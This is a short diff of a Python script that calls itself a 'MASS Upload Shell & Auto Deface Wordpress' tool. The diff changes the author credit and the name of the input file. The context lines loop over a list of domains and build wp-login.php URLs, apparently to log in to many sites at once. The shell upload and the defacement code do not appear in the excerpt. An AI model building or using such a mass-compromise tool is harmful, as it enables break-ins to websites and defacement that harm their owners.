@@ -8,13 +8,13 @@ def clearscrn():
 clearscrn()
 print("=========================================")
 print("MASS Upload Shell & Auto Deface Wordpress")
-print("          -= Coded by Bayz21 =-          ")
-print("        http://github.com/bayz21/        ")
+print("          -= Coded by TrhaCknon =-       ")
+print("        http://github.com/trhacknon/     ")
 print("           Recoded from Wp-sud           ")
 print("=========================================")
 
 with requests.session() as c:
-	list_domain = open("domen.txt", "r").readlines()
+	list_domain = open("domain.txt", "r").readlines()
 	for line in list_domain:
 		url = line.rstrip()
 		url2 = url + '/wp-login.php'
